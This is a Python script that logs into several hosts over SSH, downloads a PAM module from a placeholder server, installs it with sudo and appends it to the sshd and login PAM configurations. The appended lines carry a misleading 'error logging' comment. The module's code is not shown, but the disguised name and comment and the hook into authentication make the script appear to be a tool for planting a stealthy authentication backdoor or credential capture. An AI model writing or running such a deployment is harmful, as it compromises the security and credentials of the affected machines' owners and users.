#!/usr/bin/env python3

import subprocess

# =========================
# CONFIGURATION
# =========================

TARGETS = [
    "user@192.168.1.101",
    "user@192.168.1.102",
    "user@192.168.1.103",
]

MODULE_NAME = "pam_error_mod.so"
DOWNLOAD_URL = "http://YOUR_SERVER/pam_error_mod.so"

PAM_FILES = [
    "/etc/pam.d/sshd",
    "/etc/pam.d/login",
]

COMMENT = "# Configures PAM Error Logging; variables configured in /etc/security/limits.conf"
PAM_LINE = f"auth optional {MODULE_NAME}"

# =========================

def run_ssh_command(target, command):
    print(f"\n[+] Executing on {target}")
    result = subprocess.run(
        ["ssh", target, command],
        text=True,
        capture_output=True
    )

    if result.stdout:
        print(result.stdout)

    if result.stderr:
        print("[stderr]")
        print(result.stderr)

    if result.returncode != 0:
        print(f"[!] Command failed on {target}")

def deploy_to_target(target):
    print(f"\n========== Deploying to {target} ==========")

    remote_script = f"""
set -e

echo "[+] Detecting PAM module directory..."
if [ -d /lib64/security ]; then
    PAM_DIR="/lib64/security"
else
    PAM_DIR="/lib/security"
fi

echo "[+] Downloading module..."
curl -L -o /tmp/{MODULE_NAME} {DOWNLOAD_URL}

echo "[+] Installing module..."
sudo mv /tmp/{MODULE_NAME} $PAM_DIR/{MODULE_NAME}
sudo chmod 755 $PAM_DIR/{MODULE_NAME}

for PAM_FILE in {" ".join(PAM_FILES)}; do
    if [ ! -f "$PAM_FILE" ]; then
        echo "[-] Skipping missing $PAM_FILE"
        continue
    fi

    echo "[+] Processing $PAM_FILE"

    # Backup
    TS=$(date +%Y%m%d%H%M%S)
    sudo cp $PAM_FILE $PAM_FILE.bak.$TS

    # Check if already present
    if grep -q "{MODULE_NAME}" "$PAM_FILE"; then
        echo "[=] Already configured in $PAM_FILE"
        continue
    fi

    echo "[+] Appending PAM module to END of $PAM_FILE"

    echo "{COMMENT}" | sudo tee -a $PAM_FILE > /dev/null
    echo "{PAM_LINE}" | sudo tee -a $PAM_FILE > /dev/null

done

echo "[✓] Deployment complete on $(hostname)"
"""

    run_ssh_command(target, remote_script)

def main():
    print("Starting multi-VM PAM deployment...\n")

    for target in TARGETS:
        deploy_to_target(target)

    print("\n[✓] All deployments completed.")
    print("[!] Verify SSH/login access on all machines immediately.")

if __name__ == "__main__":
    main()